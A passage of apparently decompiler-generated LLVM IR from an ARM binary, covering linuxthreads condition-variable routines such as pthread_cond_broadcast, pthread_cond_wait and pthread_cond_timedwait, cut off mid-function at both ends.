  %v3_20af0 = inttoptr i32 %v2_20af0 to i32*
  store i32 %v0_20af0, i32* %v3_20af0, align 4
  br i1 %v2_20aec, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_20aec
  %v1_20af4 = load i32, i32* @r4, align 4
  %v2_20af4 = add i32 %v1_20af4, 28
  %v3_20af4 = inttoptr i32 %v2_20af4 to i32*
  %v4_20af4 = load i32, i32* %v3_20af4, align 4
  store i32 %v4_20af4, i32* %r0.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_20aec, %bb
  call void @__pseudo_cond_branch(i1 %v2_20aec, i32 ptrtoint (i32* @global_var_1e9d4.1269 to i32))
  %v1_20b04.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20afc

dec_label_pc_20afc:                               ; preds = %dec_label_pc_20ad0, %bb9
  %v1_20b04 = phi i32 [ %v0_20ac8, %dec_label_pc_20ad0 ], [ %v1_20b04.pre, %bb9 ]
  store i32 %v3_20abc, i32* @r4, align 4
  store i32 %v6_20abc, i32* @r5, align 4
  ret i32 %v1_20b04

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_20afc, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_20aec, { 1, 0 }
}

define i32 @_restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_20b10 = call i32 @__pthread_restart_new()
  ret i32 %v0_20b10

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 3, 2, 1, 0 }
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_20b20 = load i32, i32* @r4, align 4
  %v6_20b20 = load i32, i32* @r5, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_20b34 = call i32 @__pthread_lock()
  %v0_20b38 = load i32, i32* @r4, align 4
  %v1_20b38 = add i32 %v0_20b38, 8
  %v2_20b38 = inttoptr i32 %v1_20b38 to i32*
  %v3_20b38 = load i32, i32* %v2_20b38, align 4
  store i32 %v3_20b38, i32* %r6.global-to-local, align 4
  %v0_20b40 = load i32, i32* @r5, align 4
  store i32 %v0_20b40, i32* %v2_20b38, align 4
  %v1_20b44 = call i32 @__pthread_unlock(i32 %v0_20b38)
  %v0_20b48 = load i32, i32* @r5, align 4
  store i32 %v0_20b48, i32* @r7, align 4
  %v1_20b4c = add i32 %v0_20b48, 1
  store i32 %v1_20b4c, i32* %r5.global-to-local, align 4
  %v0_20b6c.pr = load i32, i32* %r6.global-to-local, align 4
  %v2_20b6c2 = icmp eq i32 %v0_20b6c.pr, 0
  %extract.t16 = trunc i32 %v1_20b4c to i8
  br i1 %v2_20b6c2, label %dec_label_pc_20b74, label %dec_label_pc_20b54

dec_label_pc_20b54:                               ; preds = %entry, %dec_label_pc_20b54.dec_label_pc_20b54_crit_edge
  %v1_20b4c.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_20b54.dec_label_pc_20b54_crit_edge ], [ %extract.t16, %entry ]
  %v2_20b58 = phi i32 [ %v0_20b68, %dec_label_pc_20b54.dec_label_pc_20b54_crit_edge ], [ %v0_20b6c.pr, %entry ]
  %v1_20b54 = add i32 %v2_20b58, 8
  %v2_20b54 = inttoptr i32 %v1_20b54 to i32*
  %v3_20b54 = load i32, i32* %v2_20b54, align 4
  store i32 %v3_20b54, i32* %r4.global-to-local, align 4
  %v3_20b58 = add i32 %v2_20b58, 321
  %v4_20b58 = inttoptr i32 %v3_20b58 to i8*
  store i8 %v1_20b4c.sink.off0, i8* %v4_20b58, align 1
  %v0_20b5c = load i32, i32* @r7, align 4
  %v1_20b5c = load i32, i32* %r6.global-to-local, align 4
  %v2_20b5c = add i32 %v1_20b5c, 8
  %v3_20b5c = inttoptr i32 %v2_20b5c to i32*
  store i32 %v0_20b5c, i32* %v3_20b5c, align 4
  %v0_20b60 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_20b60, i32* @r0, align 4
  %v1_20b64 = call i32 @_restart(i32 %v0_20b60)
  %v0_20b68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_20b68, i32* %r6.global-to-local, align 4
  %v2_20b6c = icmp eq i32 %v0_20b68, 0
  br i1 %v2_20b6c, label %dec_label_pc_20b74, label %dec_label_pc_20b54.dec_label_pc_20b54_crit_edge

dec_label_pc_20b54.dec_label_pc_20b54_crit_edge:  ; preds = %dec_label_pc_20b54
  %v0_20b58.pre = load i32, i32* %r5.global-to-local, align 4
  %extract.t = trunc i32 %v0_20b58.pre to i8
  br label %dec_label_pc_20b54

dec_label_pc_20b74:                               ; preds = %dec_label_pc_20b54, %entry
  store i32 %v3_20b20, i32* %r4.global-to-local, align 4
  store i32 %v6_20b20, i32* %r5.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_20b68, { 1, 2, 0 }
  uselistorder label %dec_label_pc_20b54, { 1, 0 }
}

define i32 @_thread_self.6() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_20b88 = load i32, i32* @lr, align 4
  store i32 %v0_20b88, i32* %stack_var_-4, align 4
  %v4_20b94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_20b98 = inttoptr i32 %v4_20b94 to i32*
  %v2_20b98 = load i32, i32* %v1_20b98, align 4
  %v2_20b9c = ptrtoint i32* %stack_var_-8 to i32
  %v3_20ba0 = icmp ult i32 %v2_20b9c, %v2_20b98
  br i1 %v3_20ba0, label %dec_label_pc_20bb0, label %dec_label_pc_20bdc

dec_label_pc_20bb0:                               ; preds = %entry
  %v4_20bb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_20bb8 = inttoptr i32 %v4_20bb4 to i32*
  %v2_20bb8 = load i32, i32* %v1_20bb8, align 4
  %v3_20bbc = icmp ult i32 %v2_20b9c, %v2_20bb8
  br i1 %v3_20bbc, label %dec_label_pc_20be4, label %dec_label_pc_20bc4

dec_label_pc_20bc4:                               ; preds = %dec_label_pc_20bb0
  %v4_20bc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_20bcc = inttoptr i32 %v4_20bc8 to i32*
  %v2_20bcc = load i32, i32* %v1_20bcc, align 4
  %v3_20bd0 = icmp ult i32 %v2_20b9c, %v2_20bcc
  br i1 %v3_20bd0, label %dec_label_pc_20bdc, label %dec_label_pc_20be4

dec_label_pc_20bdc:                               ; preds = %dec_label_pc_20bc4, %entry
  %v1_20bdc = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_20bc4 ]
  %v3_20bdc = inttoptr i32 %v1_20bdc to i32*
  %v4_20bdc = load i32, i32* %v3_20bdc, align 4
  br label %dec_label_pc_20c10

dec_label_pc_20be4:                               ; preds = %dec_label_pc_20bc4, %dec_label_pc_20bb0
  %v4_20be8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_20bec = inttoptr i32 %v4_20be8 to i32*
  %v2_20bec = load i32, i32* %v1_20bec, align 4
  %v2_20bf0 = icmp eq i32 %v2_20bec, 0
  br i1 %v2_20bf0, label %dec_label_pc_20c00, label %dec_label_pc_20bf8

dec_label_pc_20bf8:                               ; preds = %dec_label_pc_20be4
  %v0_20bf8 = call i32 @__pthread_find_self()
  %v2_20c14.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_20c10

dec_label_pc_20c00:                               ; preds = %dec_label_pc_20be4
  %v3_20c00 = and i32 %v2_20b9c, -2097152
  %v4_20c00 = xor i32 %v3_20c00, -2097152
  %v1_20c0c = sub i32 -352, %v4_20c00
  br label %dec_label_pc_20c10

dec_label_pc_20c10:                               ; preds = %dec_label_pc_20bf8, %dec_label_pc_20bdc, %dec_label_pc_20c00
  %v1_20c18 = phi i32 [ %v0_20bf8, %dec_label_pc_20bf8 ], [ %v4_20bdc, %dec_label_pc_20bdc ], [ %v1_20c0c, %dec_label_pc_20c00 ]
  %v2_20c14 = phi i32 [ %v2_20c14.pre, %dec_label_pc_20bf8 ], [ %v0_20b88, %dec_label_pc_20bdc ], [ %v0_20b88, %dec_label_pc_20c00 ]
  store i32 %v2_20c14, i32* @lr, align 4
  ret i32 %v1_20c18

; uselistorder directives
  uselistorder label %dec_label_pc_20c10, { 2, 0, 1 }
}

define i32 @function_20c20(i16* %arg1) local_unnamed_addr {
dec_label_pc_20c20:
  %v0_20c20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_20c20, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_20c20
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_20c20
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_20c48 = call i32 @_thread_self.6()
  %v0_20c54 = load i32, i32* @r5, align 4
  store i32 %v0_20c54, i32* @r0, align 4
  %v0_20c58 = call i32 @__pthread_lock()
  %v0_20c5c = load i32, i32* @r4, align 4
  %v0_20c60 = load i32, i32* @r5, align 4
  %v1_20c60 = add i32 %v0_20c60, 8
  store i32 %v1_20c60, i32* @r0, align 4
  %v2_20c64 = call i32 @_remove_from_queue(i32 %v1_20c60, i32 %v0_20c5c)
  %v0_20c6c = load i32, i32* @r5, align 4
  %v1_20c70 = call i32 @__pthread_unlock(i32 %v0_20c6c)
  ret i32 %v2_20c64
}

define i32 @_suspend.7(i32 %arg1) local_unnamed_addr {
entry:
  %v0_20c8c = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_20c8c
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v2_20ca0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_20cb0 = call i32 @_thread_self.6()
  %v0_20cb4 = load i32, i32* @r8, align 4
  %v1_20cb4 = add i32 %v0_20cb4, 12
  %v2_20cb4 = inttoptr i32 %v1_20cb4 to i32*
  %v3_20cb4 = load i32, i32* %v2_20cb4, align 4
  %v7_20cbc = icmp eq i32 %v3_20cb4, 3
  br i1 %v7_20cbc, label %.thread, label %bb

.thread:                                          ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br label %dec_label_pc_20ce4

bb:                                               ; preds = %entry
  %v3_20cc0 = icmp eq i32 %v3_20cb4, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br i1 %v3_20cc0, label %dec_label_pc_20ce4, label %dec_label_pc_20cd0

dec_label_pc_20cd0:                               ; preds = %bb
  %v1_20cd4 = add i32 %v0_20cb4, 8
  %v2_20cd4 = inttoptr i32 %v1_20cd4 to i32*
  %v3_20cd4 = load i32, i32* %v2_20cd4, align 4
  %v9_20cd8 = icmp eq i32 %v3_20cd4, %v0_20cb0
  br i1 %v9_20cd8, label %dec_label_pc_20ce4, label %bb23

bb23:                                             ; preds = %dec_label_pc_20cd0
  br label %dec_label_pc_20eac

dec_label_pc_20ce4:                               ; preds = %dec_label_pc_20cd0, %.thread, %bb
  %v0_20cf8 = load i32, i32* @r5, align 4
  store i32 %v0_20cf8, i32* %stack_var_-52, align 4
  %v3_20cfc = add i32 %v0_20cb0, 321
  %v4_20cfc = inttoptr i32 %v3_20cfc to i8*
  store i8 0, i8* %v4_20cfc, align 1
  %v2_20d04 = ptrtoint i32* %stack_var_-52 to i32
  %v2_20d08 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20cb0, i32 %v2_20d04)
  %v0_20d0c = load i32, i32* @r5, align 4
  store i32 %v0_20d0c, i32* @r0, align 4
  %v0_20d14 = call i32 @__pthread_lock()
  %v1_20d1c = add i32 %v0_20cb0, 66
  %v2_20d1c = inttoptr i32 %v1_20d1c to i8*
  %v3_20d1c = load i8, i8* %v2_20d1c, align 1
  %v2_20d20 = icmp eq i8 %v3_20d1c, 0
  br i1 %v2_20d20, label %dec_label_pc_20d3c, label %dec_label_pc_20d28

dec_label_pc_20d28:                               ; preds = %dec_label_pc_20ce4
  %v1_20d2c = add i32 %v0_20cb0, 64
  %v2_20d2c = inttoptr i32 %v1_20d2c to i8*
  %v3_20d2c = load i8, i8* %v2_20d2c, align 1
  %v2_20d30 = icmp eq i8 %v3_20d2c, 0
  br i1 %v2_20d30, label %dec_label_pc_20d4c, label %dec_label_pc_20d3c

dec_label_pc_20d3c:                               ; preds = %dec_label_pc_20d28, %dec_label_pc_20ce4
  %v0_20d40 = load i32, i32* @r5, align 4
  %v1_20d40 = add i32 %v0_20d40, 8
  %v2_20d44 = call i32 @_enqueue(i32 %v1_20d40, i32 %v0_20cb0)
  br label %dec_label_pc_20d4c

dec_label_pc_20d4c:                               ; preds = %dec_label_pc_20d28, %dec_label_pc_20d3c
  %storemerge = phi i32 [ 0, %dec_label_pc_20d3c ], [ 1, %dec_label_pc_20d28 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_20d4c = load i32, i32* @r5, align 4
  %v1_20d50 = call i32 @__pthread_unlock(i32 %v0_20d4c)
  %v0_20d54 = load i32, i32* @r4, align 4
  %v2_20d54 = icmp eq i32 %v0_20d54, 0
  br i1 %v2_20d54, label %dec_label_pc_20d6c, label %dec_label_pc_20d5c

dec_label_pc_20d5c:                               ; preds = %dec_label_pc_20d4c
  %v2_20d64 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20cb0, i32 0)
  br label %dec_label_pc_20e78

dec_label_pc_20d6c:                               ; preds = %dec_label_pc_20d4c
  %v0_20d74 = load i32, i32* @r7, align 4
  %v2_20d74 = add i32 %v0_20d74, 96
  %v3_20d74 = inttoptr i32 %v2_20d74 to i32*
  %v4_20d74 = load i32, i32* %v3_20d74, align 4
  store i32 134528, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_20d74)
  %v0_20d80 = load i32, i32* @r4, align 4
  store i32 %v0_20d80, i32* @sl, align 4
  %v0_20d84 = load i32, i32* @r5, align 4
  %v1_20d84 = add i32 %v0_20d84, 8
  store i32 %v1_20d84, i32* @sb, align 4
  %v1_20e0c = add i32 %v0_20cb0, 320
  %v2_20e0c = inttoptr i32 %v1_20e0c to i8*
  %v1_20e1c = add i32 %v0_20cb0, 64
  %v2_20e1c = inttoptr i32 %v1_20e1c to i8*
  br label %dec_label_pc_20d88

dec_label_pc_20d88:                               ; preds = %dec_label_pc_20e28, %dec_label_pc_20d6c
  %v0_20d8c = load i32, i32* @fp, align 4
  %v2_20d90 = inttoptr i32 %v0_20d8c to i32*
  %v3_20d90 = call i32 @__pthread_timedsuspend_new(i32 %v0_20cb0, i32* %v2_20d90)
  store i32 %v3_20d90, i32* @r6, align 4
  %v2_20d94 = icmp eq i32 %v3_20d90, 0
  br i1 %v2_20d94, label %dec_label_pc_20d9c, label %dec_label_pc_20df8

dec_label_pc_20d9c:                               ; preds = %dec_label_pc_20d88
  %v0_20da0 = load i32, i32* @r5, align 4
  store i32 %v0_20da0, i32* @r0, align 4
  %v0_20da4 = call i32 @__pthread_lock()
  %v0_20da8 = load i32, i32* @sb, align 4
  store i32 %v0_20da8, i32* @r0, align 4
  %v2_20db0 = call i32 @_remove_from_queue(i32 %v0_20da8, i32 %v0_20cb0)
  store i32 %v2_20db0, i32* @r4, align 4
  %v0_20db8 = load i32, i32* @r5, align 4
  %v1_20dbc = call i32 @__pthread_unlock(i32 %v0_20db8)
  %v0_20dc0 = load i32, i32* @r4, align 4
  %v2_20dc0 = icmp eq i32 %v0_20dc0, 0
  store i32 %v0_20cb0, i32* @r0, align 4
  br i1 %v2_20dc0, label %dec_label_pc_20df0, label %dec_label_pc_20dc8

dec_label_pc_20dc8:                               ; preds = %dec_label_pc_20d9c
  %v0_20dcc = load i32, i32* @r6, align 4
  %v2_20dd0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20cb0, i32 %v0_20dcc)
  %v0_20ddc = load i32, i32* @r7, align 4
  %v2_20ddc = add i32 %v0_20ddc, -142896
  call void @__pseudo_branch(i32 %v2_20ddc)
  br label %dec_label_pc_20eac

dec_label_pc_20df0:                               ; preds = %dec_label_pc_20d9c
  %v1_20df4 = call i32 @_suspend.7(i32 %v0_20cb0)
  br label %dec_label_pc_20df8

dec_label_pc_20df8:                               ; preds = %dec_label_pc_20d88, %dec_label_pc_20df0
  %v3_20dfc = load i8, i8* %v4_20cfc, align 1
  %v2_20e00 = icmp eq i8 %v3_20dfc, 0
  br i1 %v2_20e00, label %dec_label_pc_20e08, label %dec_label_pc_20e30

dec_label_pc_20e08:                               ; preds = %dec_label_pc_20df8
  %v3_20e0c = load i8, i8* %v2_20e0c, align 1
  %v2_20e10 = icmp eq i8 %v3_20e0c, 0
  br i1 %v2_20e10, label %dec_label_pc_20e28, label %dec_label_pc_20e18

dec_label_pc_20e18:                               ; preds = %dec_label_pc_20e08
  %v3_20e1c = load i8, i8* %v2_20e1c, align 1
  %v2_20e20 = icmp eq i8 %v3_20e1c, 0
  br i1 %v2_20e20, label %dec_label_pc_20e30, label %dec_label_pc_20e28

dec_label_pc_20e28:                               ; preds = %dec_label_pc_20e18, %dec_label_pc_20e08
  %v0_20e28 = load i32, i32* @sl, align 4
  %v1_20e28 = add i32 %v0_20e28, 1
  store i32 %v1_20e28, i32* @sl, align 4
  br label %dec_label_pc_20d88

dec_label_pc_20e30:                               ; preds = %dec_label_pc_20df8, %dec_label_pc_20e18
  %v2_20e38 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20cb0, i32 0)
  %v3_20e40 = load i8, i8* %v2_20e0c, align 1
  %v2_20e44 = icmp eq i8 %v3_20e40, 0
  br i1 %v2_20e44, label %dec_label_pc_20e8c, label %dec_label_pc_20e4c

dec_label_pc_20e4c:                               ; preds = %dec_label_pc_20e30
  %v3_20e50 = load i8, i8* %v2_20e1c, align 1
  %v2_20e54 = icmp eq i8 %v3_20e50, 0
  br i1 %v2_20e54, label %dec_label_pc_20e5c, label %dec_label_pc_20e8c

dec_label_pc_20e5c:                               ; preds = %dec_label_pc_20e4c
  store i8 0, i8* %v2_20e0c, align 1
  %v0_20e6c = load i32, i32* @r7, align 4
  %v2_20e6c = add i32 %v0_20e6c, -142896
  call void @__pseudo_branch(i32 %v2_20e6c)
  br label %dec_label_pc_20e78

dec_label_pc_20e78:                               ; preds = %dec_label_pc_20d5c, %dec_label_pc_20e5c
  %v2_20e80 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_20ca0)
  br label %dec_label_pc_20e84

dec_label_pc_20e84:                               ; preds = %dec_label_pc_20e8c, %dec_label_pc_20e78
  store i32 %v0_20cb0, i32* @r0, align 4
  %v1_20e88 = call i32 @_restart(i32 %v0_20cb0)
  br label %dec_label_pc_20e8c

dec_label_pc_20e8c:                               ; preds = %dec_label_pc_20e4c, %dec_label_pc_20e30, %dec_label_pc_20e84
  %v0_20e8c = load i32, i32* @sl, align 4
  %v1_20e8c = add i32 %v0_20e8c, -1
  store i32 %v1_20e8c, i32* @sl, align 4
  %v2_20e8c = icmp eq i32 %v0_20e8c, 0
  br i1 %v2_20e8c, label %dec_label_pc_20e94, label %dec_label_pc_20e84

dec_label_pc_20e94:                               ; preds = %dec_label_pc_20e8c
  %v0_20e9c = load i32, i32* @r7, align 4
  %v2_20e9c = add i32 %v0_20e9c, -142896
  call void @__pseudo_branch(i32 %v2_20e9c)
  br label %dec_label_pc_20eac

dec_label_pc_20eac:                               ; preds = %bb23, %dec_label_pc_20dc8, %dec_label_pc_20e94
  %v1_20eb4 = phi i32 [ 22, %bb23 ], [ 110, %dec_label_pc_20dc8 ], [ 0, %dec_label_pc_20e94 ]
  ret i32 %v1_20eb4

; uselistorder directives
  uselistorder i8* %v2_20e0c, { 1, 0, 2 }
  uselistorder i32 %v0_20cb0, { 0, 1, 8, 12, 13, 11, 14, 15, 9, 10, 7, 5, 6, 4, 3, 2, 16 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder label %dec_label_pc_20eac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20e8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20e78, { 1, 0 }
  uselistorder label %dec_label_pc_20e30, { 1, 0 }
  uselistorder label %dec_label_pc_20df8, { 1, 0 }
  uselistorder label %dec_label_pc_20d4c, { 1, 0 }
  uselistorder label %dec_label_pc_20ce4, { 0, 2, 1 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_20ec8 = load i32, i32* @r4, align 4
  %v6_20ec8 = load i32, i32* @r5, align 4
  %v9_20ec8 = load i32, i32* @r6, align 4
  %v12_20ec8 = load i32, i32* @r7, align 4
  %v15_20ec8 = load i32, i32* @lr, align 4
  %v2_20ecc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_20ed8 = call i32 @_thread_self.6()
  %v0_20edc = load i32, i32* @r7, align 4
  %v1_20edc = add i32 %v0_20edc, 12
  %v2_20edc = inttoptr i32 %v1_20edc to i32*
  %v3_20edc = load i32, i32* %v2_20edc, align 4
  %v7_20ee4 = icmp eq i32 %v3_20edc, 3
  br i1 %v7_20ee4, label %.thread, label %bb

.thread:                                          ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br label %dec_label_pc_20f0c

bb:                                               ; preds = %entry
  %v3_20ee8 = icmp eq i32 %v3_20edc, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v3_20ee8, label %dec_label_pc_20f0c, label %dec_label_pc_20ef8

dec_label_pc_20ef8:                               ; preds = %bb
  %v1_20efc = add i32 %v0_20edc, 8
  %v2_20efc = inttoptr i32 %v1_20efc to i32*
  %v3_20efc = load i32, i32* %v2_20efc, align 4
  %v9_20f00 = icmp eq i32 %v3_20efc, %v0_20ed8
  br i1 %v9_20f00, label %dec_label_pc_20f0c, label %dec_label_pc_21064

dec_label_pc_20f0c:                               ; preds = %dec_label_pc_20ef8, %.thread, %bb
  %v0_20f20 = load i32, i32* @r5, align 4
  store i32 %v0_20f20, i32* %stack_var_-36, align 4
  %v3_20f24 = add i32 %v0_20ed8, 321
  %v4_20f24 = inttoptr i32 %v3_20f24 to i8*
  store i8 0, i8* %v4_20f24, align 1
  %v2_20f2c = ptrtoint i32* %stack_var_-36 to i32
  %v2_20f30 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20ed8, i32 %v2_20f2c)
  %v0_20f34 = load i32, i32* @r5, align 4
  store i32 %v0_20f34, i32* @r0, align 4
  %v0_20f3c = call i32 @__pthread_lock()
  %v1_20f44 = add i32 %v0_20ed8, 66
  %v2_20f44 = inttoptr i32 %v1_20f44 to i8*
  %v3_20f44 = load i8, i8* %v2_20f44, align 1
  %v2_20f48 = icmp eq i8 %v3_20f44, 0
  br i1 %v2_20f48, label %dec_label_pc_20f64, label %dec_label_pc_20f50

dec_label_pc_20f50:                               ; preds = %dec_label_pc_20f0c
  %v1_20f54 = add i32 %v0_20ed8, 64
  %v2_20f54 = inttoptr i32 %v1_20f54 to i8*
  %v3_20f54 = load i8, i8* %v2_20f54, align 1
  %v2_20f58 = icmp eq i8 %v3_20f54, 0
  br i1 %v2_20f58, label %dec_label_pc_20f74, label %dec_label_pc_20f64

dec_label_pc_20f64:                               ; preds = %dec_label_pc_20f50, %dec_label_pc_20f0c
  %v0_20f68 = load i32, i32* @r5, align 4
  %v1_20f68 = add i32 %v0_20f68, 8
  %v2_20f6c = call i32 @_enqueue(i32 %v1_20f68, i32 %v0_20ed8)
  br label %dec_label_pc_20f74

dec_label_pc_20f74:                               ; preds = %dec_label_pc_20f50, %dec_label_pc_20f64
  %storemerge = phi i32 [ 0, %dec_label_pc_20f64 ], [ 1, %dec_label_pc_20f50 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_20f74 = load i32, i32* @r5, align 4
  %v1_20f78 = call i32 @__pthread_unlock(i32 %v0_20f74)
  %v0_20f7c = load i32, i32* @r4, align 4
  %v2_20f7c = icmp eq i32 %v0_20f7c, 0
  br i1 %v2_20f7c, label %dec_label_pc_20f94, label %dec_label_pc_20f84

dec_label_pc_20f84:                               ; preds = %dec_label_pc_20f74
  %v2_20f8c = call i32 @___pthread_set_own_extricate_if(i32 %v0_20ed8, i32 0)
  br label %dec_label_pc_21030

dec_label_pc_20f94:                               ; preds = %dec_label_pc_20f74
  %v0_20f9c = load i32, i32* @r6, align 4
  %v2_20f9c = add i32 %v0_20f9c, 96
  %v3_20f9c = inttoptr i32 %v2_20f9c to i32*
  %v4_20f9c = load i32, i32* %v3_20f9c, align 4
  store i32 ptrtoint (i32* @global_var_20fa8.1455 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_20f9c)
  store i32 %v0_20ed8, i32* @r0, align 4
  %v1_20fac9 = call i32 @_suspend.7(i32 %v0_20ed8)
  %v3_20fb410 = load i8, i8* %v4_20f24, align 1
  %v2_20fb812 = icmp eq i8 %v3_20fb410, 0
  %v1_20fc4 = add i32 %v0_20ed8, 320
  %v2_20fc4 = inttoptr i32 %v1_20fc4 to i8*
  br i1 %v2_20fb812, label %dec_label_pc_20fc0.lr.ph, label %dec_label_pc_20fe8

dec_label_pc_20fc0.lr.ph:                         ; preds = %dec_label_pc_20f94
  %v1_20fd4 = add i32 %v0_20ed8, 64
  %v2_20fd4 = inttoptr i32 %v1_20fd4 to i8*
  br label %dec_label_pc_20fc0

dec_label_pc_20fc0:                               ; preds = %dec_label_pc_20fc0.lr.ph, %dec_label_pc_20fe0
  %v3_20fc4 = load i8, i8* %v2_20fc4, align 1
  %v2_20fc8 = icmp eq i8 %v3_20fc4, 0
  br i1 %v2_20fc8, label %dec_label_pc_20fe0, label %dec_label_pc_20fd0

dec_label_pc_20fd0:                               ; preds = %dec_label_pc_20fc0
  %v3_20fd4 = load i8, i8* %v2_20fd4, align 1
  %v2_20fd8 = icmp eq i8 %v3_20fd4, 0
  br i1 %v2_20fd8, label %dec_label_pc_20fe8, label %dec_label_pc_20fe0

dec_label_pc_20fe0:                               ; preds = %dec_label_pc_20fd0, %dec_label_pc_20fc0
  %v0_20fe0 = load i32, i32* @r4, align 4
  %v1_20fe0 = add i32 %v0_20fe0, 1
  store i32 %v1_20fe0, i32* @r4, align 4
  store i32 %v0_20ed8, i32* @r0, align 4
  %v1_20fac = call i32 @_suspend.7(i32 %v0_20ed8)
  %v3_20fb4 = load i8, i8* %v4_20f24, align 1
  %v2_20fb8 = icmp eq i8 %v3_20fb4, 0
  br i1 %v2_20fb8, label %dec_label_pc_20fc0, label %dec_label_pc_20fe8

dec_label_pc_20fe8:                               ; preds = %dec_label_pc_20fd0, %dec_label_pc_20fe0, %dec_label_pc_20f94
  %v2_20ff0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_20ed8, i32 0)
  %v3_20ff8 = load i8, i8* %v2_20fc4, align 1
  %v2_20ffc = icmp eq i8 %v3_20ff8, 0
  br i1 %v2_20ffc, label %dec_label_pc_21044, label %dec_label_pc_21004

dec_label_pc_21004:                               ; preds = %dec_label_pc_20fe8
  %v1_21008 = add i32 %v0_20ed8, 64
  %v2_21008 = inttoptr i32 %v1_21008 to i8*
  %v3_21008 = load i8, i8* %v2_21008, align 1
  %v2_2100c = icmp eq i8 %v3_21008, 0
  br i1 %v2_2100c, label %dec_label_pc_21014, label %dec_label_pc_21044

dec_label_pc_21014:                               ; preds = %dec_label_pc_21004
  store i8 0, i8* %v2_20fc4, align 1
  %v0_21024 = load i32, i32* @r6, align 4
  %v2_21024 = add i32 %v0_21024, -142896
  call void @__pseudo_branch(i32 %v2_21024)
  br label %dec_label_pc_21030

dec_label_pc_21030:                               ; preds = %dec_label_pc_20f84, %dec_label_pc_21014
  %v2_21038 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_20ecc)
  br label %dec_label_pc_2103c

dec_label_pc_2103c:                               ; preds = %dec_label_pc_21044, %dec_label_pc_21030
  store i32 %v0_20ed8, i32* @r0, align 4
  %v1_21040 = call i32 @_restart(i32 %v0_20ed8)
  br label %dec_label_pc_21044

dec_label_pc_21044:                               ; preds = %dec_label_pc_21004, %dec_label_pc_20fe8, %dec_label_pc_2103c
  %v0_21044 = load i32, i32* @r4, align 4
  %v1_21044 = add i32 %v0_21044, -1
  store i32 %v1_21044, i32* @r4, align 4
  %v2_21044 = icmp eq i32 %v0_21044, 0
  br i1 %v2_21044, label %dec_label_pc_2104c, label %dec_label_pc_2103c

dec_label_pc_2104c:                               ; preds = %dec_label_pc_21044
  %v0_21054 = load i32, i32* @r6, align 4
  %v2_21054 = add i32 %v0_21054, -142896
